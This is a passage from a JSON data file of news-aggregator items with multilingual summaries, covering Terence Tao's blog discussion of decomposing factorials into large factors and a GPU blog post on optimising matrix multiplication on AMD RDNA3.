matrices\nrandomness\nRatner's theorem\nregularity lemma\nRicci flow\nRiemann zeta function\nSchrodinger equation\nShannon entropy\nsieve theory\nstructure\nSzemeredi's theorem\nTamar Ziegler\ntiling\nUCLA\nultrafilters\nuniversality\nVan Vu\nwave maps\nYitang Zhang The Polymath BlogPolymath projects 2021A sort of Polymath on a famous MathOverflow problemTen Years of PolymathUpdates and PicturesPolymath proposal: finding simpler unit distance graphs of chromatic number 5A new polymath proposal (related to the Riemann Hypothesis) over Tao’s blogSpontaneous Polymath 14 – A success!Polymath 13 – a success!Non-transitive Dice over Gowers’s BlogRota’s Basis Conjecture: Polymath 12, post 3\n\n\t\t\t21 comments\n\t\t\tComments feed for this article\n\n\t\t\t26 March, 2025 at 8:27 pm\n\t\t\tAnonymous\n\n\t\t\t\t\t\tthere is an open brace for href\n[Corrected, thanks – T.]\n\n\t\t\t\tReply\n\n\t\t\t26 March, 2025 at 11:04 pm\n\t\t\tSamuel Bonaya Buya\n\n\t\t\t\t\t\tIn my opinion the paper is a significant contribution by Tao on the understanding of the prime number theorem\n\n\t\t\t\tReply\n\n\t\t\t27 March, 2025 at 4:02 am\n\t\t\tAntoine Deleforge\n\n\t\t\t\t\t\tLooking at the first few numbers in the OEIS sequence, it looks like t(n+1) – t(n) is always zero or one. Is there any reason for this to be true?\n\n\t\t\t\tReply\n\n\t\t\t27 March, 2025 at 6:39 am\n\t\t\tTerence Tao\n\n\t\t\t\t\t\tNo; in fact, in Guy’s article on this problem, he notes that there is a jump of  from  to  (though he does not provide enough preceding values to extend the sequence in the OEIS).  In that article he also notes that Erdos conjectures that the gaps can in fact be arbitrarily large, though I see no way to attack this question even heuristically (as the extremizers for this problem may be neither structured nor (pseudo)random, but exhibit some very strange intermediate behavior).\nIn the image below, I display the upper bound on  (the pink dots) in the intermediate range  coming from Lemma 2.1 of my paper (there is no plot for  in this image as I do not have data in this range).  [Incidentally there is a slight typo in that lemma, which I will correct in the next revision: the term  should instead be .]  There is considerable fluctuation here (due to the corresponding fluctuation in the primes), which is also reflected in the related plot in Figure 2 of the paper.  Of course, fluctuation in the upper bound for  does not imply fluctuation in the true value of , but it is perhaps evidence in that direction.\n\nAnd below is a comparison of the upper bound against the true value of  in the range :\n\n\t\t\t\tReply\n\n\t\t\t27 March, 2025 at 4:14 am\n\t\t\tIvan\n\n\t\t\t\t\t\tYou may want to enclose the comma in curly brackets when it is used as a thousands separator so that  does not generate extra space after it, e.g.,  instead of  (p. 3 of the paper).\n[Thanks, this will be done in the next revision of the ms -T]\n\n\t\t\t\tReply\n\n\t\t\t27 March, 2025 at 5:18 am\n\t\t\tAntoine Deleforge\n\n\t\t\t\t\t\tI don’t immediately see the connection to the knapsack problem. If we pick the non-dividable items to be the logs of the prime factors of N!, then the problem amounts to distributing *all* of these items into N knapsacks, such that each knapsack contains *at least* a value of t(N). This is quite different from the original knapsack problem where the goal is rather to select a *subset* of items, and maximize the value while remaining *below* the knapsack capacity. Is there a deeper or more natural connection that I am missing? Can further progress on this Erdos problem be expected to eventually yield insights on the knapsack problem, or is the relation between the two too distant for that to happen?\n\n\t\t\t\tReply\n\n\t\t\t27 March, 2025 at 6:53 am\n\t\t\tTerence Tao\n\n\t\t\t\t\t\tIt’s more accurate to say that the factorial problem is a *variant* of the knapsack problem; most directly, it corresponds to a knapsack problem with negative item sizes (and negative capacity in the backpack), which of course is not physically realistic (or intuitive), but it is possible that some of the knapsack algorithms that work for positive sizes and capacities can carry over to this new context with suitable modification.  (For instance, I would guess that the problem of solving this sort of factoring problem for a general input number (rather than a factorial) is NP-complete, by some modification of the proof of NP-completeness of the knapsack problem.)\nNote by the way that to solve the factorization problem, it suffices to distribute some subset of the log-primes into the knapsacks rather than all of them, since one can just add in the remaining log-primes arbitrarily to finish the job.\n\n\t\t\t\tReply\n\n\t\t\t28 March, 2025 at 11:21 pm\n\t\t\tAnonymous\n\n\t\t\t\t\t\tAt first view it looks that this is closer to a Bin packing problem than to a knapsack problem.\n\n\t\t\t\tReply\n\n\t\t\t29 March, 2025 at 5:50 am\n\t\t\tTerence Tao\n\n\t\t\t\t\t\tFollowing your hint, it seems in fact that this problem is a special case of the bin covering problem, which is dual to the bin packing problem.\n\n\t\t\t\tReply\n\n\t\t\t27 March, 2025 at 7:08 am\n\t\t\tducduc2710\n\n\t\t\t\t\t\tThat technique I think can be used to limit prime gaps.\n\n\t\t\t\tReply\n\n\t\t\t27 March, 2025 at 7:21 am\n\t\t\tAnonymous\n\n\t\t\t\t\t\tSmall typo: “multiples of four between3/4 to N” It should be 3/4N to N.\n\n[Corrected, thanks -T.]\n\n\t\t\t\tReply\n\n\t\t\t27 March, 2025 at 11:35 am\n\t\t\tTerence Tao\n\n\t\t\t\t\t\tI’m posting (with permission) some computational work by Andrew Sutherland, who implemented a greedy approach working through the prime factors  of  inreverse order (with multiplicity), constucting integers of the form  with  chosen to be minimal subject to the constraint that it can be constructed from the divisors of  that still remain. For instance when , it is able to factor  into  numbers greater than or equal to , verifying the Guy-Selfridge conjecture at this value. The code (in Maple) is at https://math.mit.edu/~drew/GuySelfridge.m . An earlier (less efficient) factorization with these parameters can be found at https://math.mit.edu/~drew/ES300000.txt .\nAndrew writes, ” It only takes about a few seconds on a fast machine so I was able to run it on all  in  and noticed that while it typically succeeds on , it still fails to prove  in  cases in , including  as large as . But it succeeds on every  in , so if the conjecture is true, it is still true if you replace  with  (probably this can be lowered a lot further, the greedy approach is not optimal).\nI then tested the threshold  on all  from  to . It failed only for “.\nWith this data, one can now reduce conjecture (ii) to conjecture (iii) provided one can construct suitable factorizations of  to resolve the three remaining cases  (one also has to retest the range  but this should be straightforward, since there is now enough room that one should be able to sample this range quite sparsely, e.g., test the threshold  for  a multiple of ). But the range  seems a bit more delicate, as the most direct greedy algorithm sometimes fails.\nAndrew adds, “I think it’s possible that one might be able to turn this algorithm into an asymptotic bound. For sufficiently large prime divisors  of , you can just take  because  will be small and there are plenty of powers of small primes initially available (and you can quantify this), and even if you focus just on the integers the algorithm constructs before it hits the first cofactor it cannot minimize you should get some constant factor of  that might be bigger than .”\n\n\t\t\t\tReply\n\n\t\t\t27 March, 2025 at 12:18 pm\n\t\t\tTerence Tao\n\n\t\t\t\t\t\tAndrew has kindly shared with me the lower bounds for  for  given by this approach, and I have incorporated them into my previous plot here, showing the current upper (pink) and lower (blue) bounds on :\n\nNote the verification of the conjecture  in this range for .  The data also replicates Guy’s reported values , and suggests that the jumps in  are indeed rather irregular. (The text file for the data can be found here.)\n\n\t\t\t\tReply\n\n\t\t\t27 March, 2025 at 2:35 pm\n\t\t\tfrobitzblog\n\n\t\t\t\t\t\tWith a bit of fiddling by hand I was able to improve the factorizations for N=182,200,207, so now (ii) is confirmed up to 100,000.  You can find the factorizations here, here, and here.\n\n\t\t\t\tReply\n\n\t\t\t28 March, 2025 at 8:12 am\n\t\t\tAnonymous\n\n\t\t\t\t\t\tShould inequality (4) have t(N)/N on the left-hand side (as opposed to just t(N))?\n[Corrected, thanks – T.]\n\n\t\t\t\tReply\n\n\t\t\t28 March, 2025 at 8:16 pm\n\t\t\tTerence Tao\n\n\t\t\t\t\t\tA back of the envelope calculation suggests that the upper bound in my paper, if made explicit, would verify the conjecture  for roughly .  (There are particular inefficiencies when  is slightly larger than a power of two, as it then becomes expensive to adopt strategies that save the powers of two for last.)  So some additional constructions will be needed to cover the medium range .\nA natural idea to improve both the numerics and the asymptotics is to mix and match powers of 2 and 3 in the endgame when these are the only primes left to assign, taking advantage of the incommensurability of  and  to get more accurate matches to a target threshold.  This does make the algorithms and analysis more complicated, though.\n\n\t\t\t\tReply\n\n\t\t\t29 March, 2025 at 6:34 am\n\t\t\tTerence Tao\n\n\t\t\t\t\t\tAfter running Andrew’s code to verify  I noticed that the greedy algorithm exhausts the factors of 2 and 3 relatively early; by the time the algorithm reaches the prime 29, the factors of 2 and 3 are already gone and so one has to use primes 5 and higher to fill up the remaining factors.  This is likely the main source of inefficiency in the direct greedy algorithm.  Some sort of ad hoc modification of the greedy algorithm in which some preference is given to terms that avoid 2 and 3 may improve performance.  If one can get to a final stage where only powers of 2 and 3 remain, then it may also make sense to switch from a greedy method to a linear programming method: specifically, if one wants to distribute , one can locate the smallest  with , and the smallest  with , and express  as an integer linear combination of  and  (plus a negligible error which one may simply discard) to get a pretty good factorization.\n\n\t\t\t\tReply\n\n\t\t\t29 March, 2025 at 7:04 am\n\t\t\tTerence Tao\n\n\t\t\t\t\t\tCurrently, Andrew’s code permits one to factor  for  into  factors greater than or equal to , so one has a surplus of  factors here.  I am hoping that this surplus can be increased somewhat through some tweaking of the greedy algorithm, which should allow one to cover more ranges for the conjecture .  I have in mind something like this:\n1.  First, apply the greedy algorithm to remove all primes larger than, say, .  These primes will be problematic no matter what algorithm one chooses (it is rare for their multiples to be very close to ) and so one may as well dispose of them as efficiently as possible immediately.\n2.  Now, take all the numbers between  and (say)  that are coprime to both  and , and remove them from the remaining portion of  (only if they are available, of course).  Iterate this greedily until no further such numbers can be removed.  One should now be left with mostly copies of  and  and only a small number of remaining primes to allocate (the point being that the numbers between  and  have a very similar distribution of prime factors to the numbers between  and , except at the large primes which we have just removed).\n3.  Use the greedy algorithm again to eliminate all primes larger than .  This should leave a large pool of copies of  and .\n4.  Use the linear programming method in the previous comment to group these copies of  and  into quantities  slightly larger than .\n5.  Apply the greedy algorithm to clean up any leftovers.\nUnfortunately I will not have time today to try to implement such a scheme, but perhaps other commenters could try this (or some other method) to improve upon the previous surplus of 372, which I think is a reasonable proxy for algorithmic efficiency.  Note for this value of  that , which provides a hard upper limit for the surplus (and due to the large primes which can’t be multiplied to be close to , the hard limit is actually a little less than this).  Still, there is room for improvement beyond 372.\nEDIT: by taking into account the amount by which all large primes will go over  (see Lemma 2.1 of the paper; the gap between the LHS and RHS of (2.1), divided by , upper bounds the surplus), I now revise the theoretical upper limit for the surplus to just 454.  So not as much room for improvement as I thought… the greedy algorithm is actually quite efficient!  This also suggests that if the greedy algorithm fails significantly at some  slightly larger than 300000, then the Guy-Selfridge conjecture may in fact be false.\n\n\t\t\t\tReply\n\n\t\t\t29 March, 2025 at 5:25 pm\n\t\t\tTerence Tao\n\n\t\t\t\t\t\tI was able to get the surplus in the  verification up to 410 (here is the list of factors) by an extremely ad hoc method; I had attempted to coax the greedy algorithm to set aside some powers of 2 and 3 for later use, which helped somewhat (I could improve 372 to 401 this way), but then by accidentally putting in some rather bad choices of parameters (which used up the powers of 2 and 3 prematurely), I mysteriously got an improvement to 410.  It seems there are a lot of discontinuities in this problem; I am not sure how to systematize the search for better constructions.\n\n\t\t\t\tReply\n\n\t\t\t29 March, 2025 at 1:54 am\n\t\t\tAnonymous\n\n\t\t\t\t\t\t@Ivan Or even better; use num from the siunitx package (or qty for physical quantities) when typing numbers with more than four digits on either side of the decimal marker.\n\n\t\t\t\tReply\n\n\t\t\t29 March, 2025 at 2:45 am\n\t\t\tAnonymous\n\n\t\t\t\t\t\tI’ve only been experimenting with small factorials, but fractional improvements can be made by optimising the factorisation process.\n\n\t\t\t\tReply\n\n\t\tLeave a comment Cancel reply\n\n\t\t\tΔdocument.getElementById( \"ak_js_1\" ).setAttribute( \"value\", ( new Date() ).getTime() );",
    "summary": {
      "en": "Terence Tao recently published a paper titled \"Decomposing a Factorial into Large Factors,\" which explores how to break down a factorial number into a specified number of factors, each at least a certain size. This concept was introduced by mathematician Paul Erdös, who sought to understand the best way to evenly distribute a factorial into several parts.\n\nKey points from the paper include:\n\n1. **Definition of the Quantity**: Tao defines a quantity related to factorials, which indicates the largest number of factors into which a factorial can be divided, with each factor meeting a minimum size requirement.\n\n2. **Previous Work**: Erdös and others previously estimated upper and lower bounds for this quantity. There was a claim that the upper bound was asymptotically accurate, but their proof was lost after a collaborator passed away.\n\n3. **Conjectures**: Tao discusses conjectures made by other mathematicians about the properties of this quantity, suggesting potential relationships and patterns that could be explored.\n\n4. **Methodology**: Tao describes his approach to establishing bounds for this quantity. He uses prime numbers effectively and proposes a method of factor rearrangement that could lead to better approximations.\n\n5. **Future Directions**: The paper hints at the possibility of crowd-sourcing computational efforts to verify certain conjectures and improve factorization methods, indicating that this area of study remains active and open to further exploration.\n\nOverall, Tao's work seeks to deepen the understanding of how factorials can be decomposed while addressing unresolved questions from previous studies in this mathematical field.",
      "ko": "테렌스 타오가 최근 발표한 논문 \"팩토리얼을 큰 인수로 분해하기\"에서는 팩토리얼 숫자를 특정한 수의 인수로 나누는 방법을 탐구하고 있습니다. 각 인수는 최소한의 크기 요건을 충족해야 합니다. 이 개념은 수학자 폴 에르되시가 처음 제안했으며, 그는 팩토리얼을 여러 부분으로 고르게 나누는 최선의 방법을 이해하고자 했습니다.\n\n논문의 주요 내용은 다음과 같습니다. 첫째, 타오는 팩토리얼과 관련된 양을 정의하며, 이는 팩토리얼을 나눌 수 있는 최대 인수의 수를 나타내고, 각 인수는 최소 크기 요건을 충족해야 합니다. 둘째, 에르되시와 다른 연구자들은 이 양의 상한과 하한을 추정한 바 있습니다. 상한이 점근적으로 정확하다는 주장이 있었으나, 그들의 증명은 협력자가 사망한 후 잃어버렸습니다.\n\n셋째, 타오는 다른 수학자들이 제기한 이 양의 성질에 대한 추측을 논의하며, 탐구할 수 있는 잠재적인 관계와 패턴을 제안합니다. 넷째, 타오는 이 양의 경계를 설정하기 위한 자신의 접근 방식을 설명하며, 소수를 효과적으로 활용하고 인수 재배열 방법을 제안하여 더 나은 근사를 이끌어낼 수 있는 가능성을 제시합니다. 마지막으로, 논문은 특정 추측을 검증하고 인수 분해 방법을 개선하기 위해 컴퓨터 계산 작업을 공동으로 수행할 가능성을 암시하며, 이 연구 분야가 여전히 활발하고 추가 탐구가 가능함을 나타냅니다.\n\n전반적으로 타오의 연구는 팩토리얼이 어떻게 분해될 수 있는지를 깊이 이해하고, 이 수학 분야에서 이전 연구에서 해결되지 않은 질문들을 다루고자 합니다.",
      "ja": "テレンス・タオは最近、「大きな因子への階乗の分解」というタイトルの論文を発表しました。この論文では、階乗の数を指定された数の因子に分解する方法について探求しています。各因子は一定の大きさ以上である必要があります。この概念は数学者ポール・エルデシュによって提唱され、階乗をいくつかの部分に均等に分配する最良の方法を理解しようとしたものです。\n\n論文の重要なポイントには以下のものがあります。まず、タオは階乗に関連する量を定義しています。この量は、階乗を分割できる最大の因子の数を示し、各因子は最小の大きさの要件を満たす必要があります。\n\n次に、エルデシュや他の研究者たちは、この量の上限と下限を以前に推定していました。上限が漸近的に正確であるという主張がありましたが、その証明は共同研究者の死後に失われてしまいました。\n\nまた、タオは他の数学者によるこの量の特性に関する予想についても言及し、探求可能な関係やパターンを示唆しています。タオはこの量の境界を確立するためのアプローチを説明しており、素数を効果的に利用し、因子の再配置の方法を提案しています。これにより、より良い近似が得られる可能性があります。\n\nさらに、論文は特定の予想を検証し、因数分解の方法を改善するために計算作業をクラウドソーシングする可能性についても触れています。この分野の研究は活発であり、さらなる探求が期待されています。\n\n全体として、タオの研究は階乗の分解に関する理解を深め、以前の研究で未解決の問題に取り組むことを目指しています。"
    }
  },
  {
    "id": "7265932f6ff4bdeb",
    "title": {
      "en": "Optimizing Matrix Multiplication on RDNA3",
      "ko": "RDNA3 행렬 곱셈 최적화",
      "ja": "RDNA3行列計算最適化"
    },
    "type": "story",
    "url": "https://seb-v.github.io/optimization/update/2025/01/20/Fast-GPU-Matrix-multiplication.html",
    "score": 115,
    "by": "skidrow",
    "time": 1742896521,
    "content": "Introduction\n\nHi everyone !\n\nIn this post, I will share with you all the steps to write an optimized FP32 matrix multiplication on AMD RDNA3 GPU outperforming rocBLAS by 60%. I will cover some basics and explain all the optimizations I have implemented. This will be done in a iterative way in 8 differents Kernels.\n\n  Figure 1: sneak peek of the performance results\n\nI primary intended to work on this to deepen my understanding of RDNA3 and try out HIP and I felt like I needed to share what I learned doing this :).\n\nFew things I like to say before we start :\n\n  All the information I used comes from the publicly available ISA guide1\n  I don’t intend to re-implement or replace rocBLAS\n  I only focused on 4096x4096 matrices single precision (FP32) matrix multiplication for the sake of simplicity.\n  All my tests were done on Windows 11 with a AMD Radeon 7900 XTX.\n\nThat being said, let’s start !\n\nProblem statement\n\nThere is a lot of research happening on the way to improve the performance of matrix multiplication nowadays. Being a core algorithm in ML applications, any FLOPS we can exploit is golden.\n\nBefore proceeding, let’s recall the basics of matrix multiplication. Given two matrices:\n\n  A of size M,K\n  B of size K,N\n\nTheir product, C, is computed as follows:\n\nCij=∑k=0K−1Aik⋅Bkj\n\ni∈[0,M−1]\nj∈[0,N−1]\n\nwhere C is the resulting matrix of size M,N.\n\nFor each output value of matrix C, we compute the dot product between the rows of matrix A and the columns of matrix B.\n\n  Figure 2: example for the first element of C\n\nIn terms of complexity, we have O(n3) computational complexity and O(n2) memory accesses.\nIf we don’t think about architectural details, this is clearly a compute bound problem and our goal will be to be compute bound on the GPU.\n\nLet’s say we manage to write the best implementation possible for the 7900 XTX. How fast could it run ? To answer this questions we need to look a bit at RDNA3 architecture.\n\nRDNA3 GPUs are made of arrays of WorkGroup Processors (WGP). Every WGP are split into 2 Compute Units (CUs), themself split into 2 SIMDs. A SIMD handles the work of multiple threads organized in waves (or warps for CUDA folks) and has a set of components to do some work (like arithmetic operations). For Floating point operations, there are two 32 way VALU units.\n\n  Figure 3: simplified representation of WGPs\n\n  Figure 4: simplified representation of a single SIMD\n\nWe can compute our theoritical floating point operation per second with this formula:\n\nFLOPS=freq∗nbSIMD∗flopsPerSIMD\n\nEvery SIMD can issue 2 Floating points intructions per cycle (one on each vALU unit). If we use FMA instructions (Fused Multiply Add), each SIMD can issue 32∗2∗2=128 floating point operations per cycle.\nThe 7900 XTX has 48 WGPs, that’s 48∗2∗2=192 SIMDs.\n\nFLOPS=2500∗106∗192∗128FLOP/s\n\nFLOPS=61.44TFLOP/s\n\nOur theoritical VRAM bandwidth is given by :\n\nBW=rate∗busWidth/8\n\nThe 7900 XTX uses GDDR6 with a 384-bit bus running at 20 Gbps.\n\nBW=20∗384/8=960GB/s\n\nIf we go back to our 4096x4096 matrix multiplication, we essentially need to do 2∗4096∗4096∗4096 operations.\nWith a 61 TFLops implementation, it would take roughly 2.23 ms to do the work and the bandwidth required to sustain this rate would be 4096∗4096∗4∗3/2.23∗10−3=90.2GB/s.\n\nOf course, these are oversimplified calculations as they totally ignore memory hierarchy but we see that the available bandwidth is sufficiently high so that we can increase the amount of data we read to be closer to compute bound.\n\nKernel 1: naive implementation\n\nLet’s start with a naive implementation like this :\n\n__global__ void kernel1_naive(const float *A, const float *B, float *C, int M, int K, int N, float alpha, float beta)\n{\n    int row = blockIdx.y * blockDim.y + threadIdx.y;\n    int col = blockIdx.x * blockDim.x + threadIdx.x;\n    if (row < M && col < N)\n    {\n        float acc_c = 0.0f;\n        for (int k = 0; k < K; ++k)\n        {\n            acc_c += A[row * K + k] * B[k * N + col];\n        }\n        C[row * N + col] = alpha * acc_c + beta * C[row * N + col];\n    }\n}\n\nYou will notice I am doing  C=alpha∗A∗B+beta∗C instead of C=A∗B here. This is because it makes easier to compare with libraries like rocBLAS where matrix multiplications is provided by SGEMM functions (Single-Precision General Matrix Multiply).\n\nWe launch 4096x4096 threads with a blocksize of 16x16 and each thread compute the inner dot product described before.\n\nThe performance for this kernel is 136 ms (1010.60 GFlops/s). I know, that’s pretty bad and far off our 61 TFLops target.\n\nKernel 0: rocBLAS reference implementation\n\nNow that we have seen possibly the worst implementation in terms of performance, let’s look at the official rocBLAS implementation.\n\n    const int M = N;\n    const int K = N;\n    CHECK_ROCBLAS_STATUS(rocblas_sgemm(\n        handle,\n        rocblas_operation_none, // Transpose option for A\n        rocblas_operation_none, // Transpose option for B\n        M,                      // Number of rows in A and C\n        N,                      // Number of columns in B and C\n        K,                      // Number of columns in A and rows in B\n        &alpha,                 // alpha\n        d_a,                    // Matrix A on the device\n        M,                      // Leading dimension of A\n        d_b,                    // Matrix B on the device\n        K,                      // Leading dimension of B\n        &beta,                  // beta\n        d_c,                    // Matrix C on the device\n        M                       // Leading dimension of C\n        ));\n\nAs discussed before, I used rocblas_sgemm function with alpha and beta set to 1.02\n\nThe performance for this kernel is 4.49 ms (30547 GFLOPs/s). This is clearly much better than our kernel 1 but still far from our theoritical 61.4 TFlops/s.\n\nBy inspecting the ISA in RGP3, I couldn’t find any dual issue instructions in the kernel (only v_fmac_f32_e32)4\n\n  Figure 5: extract of rocBLAS ISA code\n\nThis is very surprising as this essentially means one of the VALU unit is sitting there doing nothing.\n\nConsidering this, the VALU utilization of this kernel is pretty impressive and almost 100 %. However, it’s really surprising we can’t exploit these dual issue instructions properly. I’ll come to that later.\n\nKernel 2: LDS Tiling\n\nThe main issue with our naive kernel is that our inner loop directly accesses global memory. This is inefficient because fetching data from global memory has a high latency, typically on the order of hundreds of cycles. Since each memory read is followed by minimal computation (just one multiplication and one addition), the GPU struggles to hide this latency, even with a large number of concurrent threads. Moreover, the algorithm repeatedly reads the same rows and columns from global memory across different threads, leading to redundant memory accesses and further exacerbating the performance bottleneck.\n\nA solution to this problem is to load the data once into faster local memory and then iterate efficiently over it with all the threads. On RDNA3, we have the Local Data Store (LDS), a high-speed, low-latency memory accessible by all threads within a workgroup.\n\n  Figure 6: simplified representation of the memory hierarchy\n\nSince the LDS has a much smaller capacity than global memory, we need to use tiling to divide our problem into smaller sub-matrix multiplications. One way to facilitate this is to restructure the computation by moving the inner loop’s dot product to the outer loop. The key idea is to cache a column of matrix A and a row of matrix B, then perform the computation across the entire tile. This approach is more cache-efficient and significantly reduces memory access latency.\n\nThe pseudo code for our kernel 1 is :\n\nfor i from 0 to M - 1:                  # Loop over rows of A\n    for j from 0 to N - 1:              # Loop over columns of B\n        sum = 0\n        for k from 0 to K - 1:          # Loop over columns of A / rows of B\n            sum += A[i][k] * B[k][j]\n        end for\n        C[i][j] = sum\n    end for\nend for\n\nIf we move the dot product to the outer loop, we have this :\n\nfor k from 0 to K - 1:                  # Outer loop over the shared dimension\n    for i from 0 to M - 1:              # Loop over rows of A\n        for j from 0 to N - 1:          # Loop over columns of B\n            C[i][j] += A[i][k] * B[k][j]\n        end for\n    end for\nend for\n\nTiling in this form is straightforward: each workgroup operates on a tile and follows these steps: (BK is the batch size, ie number of rows/columns we load to the LDS)\n\nInit c to 0\nWhile kId is less than N:\n  # Load A and B to Tile As and Bs\n  Load BK columns A to As\n  Load BK rows to Bs\n  Syncthreads\n  # Accumulate results using LDS\n  for k from 0 to BK\n    c += As[threadIdx.y][k] * Bs[k][threadIdx.x]\n  Syncthreads\n  Increment kId by BK\nend for\nc[row][col]=c\n\nIf we choose a tile size of 32x32 and BK=32, our new kernel looks like this:\n\n#define TILE_SIZE 32\n__global__ void kernel2_lds(const float *A, const float *B, float *C, int N)\n{\n    __shared__ float As[TILE_SIZE][TILE_SIZE];\n    __shared__ float Bs[TILE_SIZE][TILE_SIZE];\n\n    int row = blockIdx.y * TILE_SIZE + threadIdx.y;\n    int col = blockIdx.x * TILE_SIZE + threadIdx.x;\n\n    float sum = 0.0f;\n\n    for (int t = 0; t < N; t += TILE_SIZE)\n    {\n        Bs[threadIdx.y][threadIdx.x] = B[N * (threadIdx.y + t) + col];\n        As[threadIdx.y][threadIdx.x] = A[N * row + t + threadIdx.x];\n\n        __syncthreads();\n\n        for (int k = 0; k < TILE_SIZE; k++)\n        {\n            sum += As[threadIdx.y][k] * Bs[k][threadIdx.x];\n        }\n\n        __syncthreads();\n    }\n\n    if (row < N && col < N)\n    {\n        C[row * N + col] = sum;\n    }\n}\n\n__syncthreads(); is required here to ensure that all threads in the workgroup can see the data loaded into the LDS and to synchronize before any updates are made to the data.\n\nWe also ensure that the contents of both matrices A and B are loaded into the LDS by rows rather than columns to avoid uncoalesced memory accesses.\nIndeed, if we were to read by columns, each thread in a wave would access a non-contiguous memory region, result",
    "summary": {
      "en": "**Summary:**\n\nIn this post, the author explains how to optimize FP32 matrix multiplication on an AMD RDNA3 GPU, aiming to improve performance by 60% over the rocBLAS library. The focus is on 4096x4096 matrices and is based on research into matrix multiplication, a key algorithm in machine learning.\n\n**Key Points:**\n\n1. **Matrix Multiplication Basics:** The post outlines how to compute the product of two matrices using the dot product, which involves considerable computations (O(n³) complexity).\n\n2. **RDNA3 Architecture:** The GPU architecture is described, highlighting its components like WorkGroup Processors (WGP), Compute Units (CUs), and SIMD units, which are essential for optimizing performance.\n\n3. **Performance Calculations:** The theoretical performance of the AMD Radeon 7900 XTX GPU is calculated, suggesting it can achieve 61.44 TFLOPS with sufficient memory bandwidth (960 GB/s).\n\n4. **Naive Implementation:** A basic kernel for matrix multiplication is presented, achieving only 1010.60 GFLOPS/s, which is far from the theoretical maximum.\n\n5. **rocBLAS Comparison:** The performance of the rocBLAS library's implementation is also discussed, showing it performs better but still underutilizes the GPU's potential.\n\n6. **Optimization Strategy:** The author introduces the concept of using Local Data Store (LDS) for faster memory access in the GPU. This involves tiling the matrix multiplication to reduce latency and improve cache efficiency.\n\n7. **Improved Kernel Implementation:** The post outlines a more efficient kernel that uses tiling and LDS, demonstrating how to load data into faster memory and perform calculations more effectively.\n\nOverall, the author aims to share insights gained from this optimization process, hoping to enhance understanding of GPU programming and matrix multiplication efficiency.",
      "ko": "이 글에서는 AMD RDNA3 GPU에서 FP32 행렬 곱셈을 최적화하는 방법을 설명하며, rocBLAS 라이브러리보다 성능을 60% 향상시키는 것을 목표로 하고 있습니다. 주로 4096x4096 크기의 행렬에 초점을 맞추고 있으며, 이는 기계 학습에서 중요한 알고리즘인 행렬 곱셈에 대한 연구를 바탕으로 하고 있습니다.\n\n행렬 곱셈의 기본 개념을 설명하며, 두 행렬의 곱을 계산하는 방법을 다룹니다. 이 과정은 상당한 계산량을 요구하며, 복잡도는 O(n³)입니다. RDNA3 아키텍처에 대해 설명하면서, 성능 최적화에 필수적인 구성 요소인 작업 그룹 프로세서(WGP), 컴퓨트 유닛(CU), SIMD 유닛 등을 강조합니다.\n\nAMD Radeon 7900 XTX GPU의 이론적 성능을 계산한 결과, 충분한 메모리 대역폭(960 GB/s)을 갖추면 61.44 TFLOPS에 도달할 수 있음을 보여줍니다. 기본적인 행렬 곱셈 커널을 제시하며, 이 커널은 1010.60 GFLOPS/s의 성능을 내지만 이론적 최대치에는 미치지 못합니다. rocBLAS 라이브러리의 구현 성능도 비교하며, 더 나은 성능을 보이지만 여전히 GPU의 잠재력을 충분히 활용하지 못하고 있음을 지적합니다.\n\n저자는 GPU에서 더 빠른 메모리 접근을 위해 로컬 데이터 저장소(LDS)를 사용하는 최적화 전략을 소개합니다. 이는 행렬 곱셈을 타일링하여 지연 시간을 줄이고 캐시 효율성을 높이는 방법입니다. 개선된 커널 구현을 설명하며, 타일링과 LDS를 활용해 데이터를 더 빠른 메모리에 로드하고 계산을 보다 효과적으로 수행하는 방법을 보여줍니다.\n\n이 최적화 과정을 통해 얻은 통찰을 공유하며, GPU 프로그래밍과 행렬 곱셈의 효율성에 대한 이해를 높이고자 합니다.",
      "ja": "この投稿では、著者がAMD RDNA3 GPU上でFP32行列乗算を最適化する方法を説明しています。rocBLASライブラリに対して60%の性能向上を目指しています。特に4096x4096の行列に焦点を当てており、これは機械学習における重要なアルゴリズムである行列乗算に関する研究に基づいています。\n\n行列乗算の基本について、二つの行列の積をドット積を用いて計算する方法が説明されています。この計算にはかなりの計算量が必要で、計算の複雑さはO(n³)です。\n\nRDNA3アーキテクチャについても詳しく説明されており、性能最適化に不可欠なワークグループプロセッサ（WGP）、計算ユニット（CU）、SIMDユニットなどの構成要素が強調されています。\n\nAMD Radeon 7900 XTX GPUの理論的な性能も計算されており、十分なメモリ帯域幅（960 GB/s）があれば61.44 TFLOPSを達成できることが示されています。\n\n基本的な行列乗算のカーネルも紹介されており、これでは1010.60 GFLOPS/sしか達成できず、理論的な最大値には遠く及びません。\n\nrocBLASライブラリの実装の性能も比較されており、rocBLASはより良い性能を発揮しますが、依然としてGPUの潜在能力を十分に活用していないことが示されています。\n\n著者は、GPU内での高速メモリアクセスのためにローカルデータストア（LDS）を使用するという最適化戦略を紹介しています。これにより、行列乗算をタイル状に分割し、レイテンシを減少させ、キャッシュ効率を向上させることが可能になります。\n\nさらに、タイルとLDSを利用したより効率的なカーネルの実装が説明されており、データを高速メモリにロードし、計算をより効果的に行う方法が示されています。\n\n著者はこの最適化プロセスから得られた洞察を共有し、GPUプログラミングや行列乗算の効率についての理解を深めることを目指しています。"
    }
  },
  {
    "id": "e10d9fa3796db987",
    "title": {
      "en": "Portlander creates AI-powered device to monitor street health",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://bikeportland.org/2025/03/18/portlander-creates-ai-powered-device-to-monitor-street-health-393363",
    "score": 16,
    "by": "burlesona",
    "time": 1742933718,
    "content": null,
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "4652de53cf75cf94",
    "title": {
      "en": "How to write blog posts that developers read",
      "ko": "개발자가 읽는 블로그 쓰기",
      "ja": "開発者が読むブログ術"
    },
    "type": "story",
    "url": "https://refactoringenglish.com/chapters/write-blog-posts-developers-read/",
    "score": 548,
    "by": "rbanffy",
    "time": 1743159679,
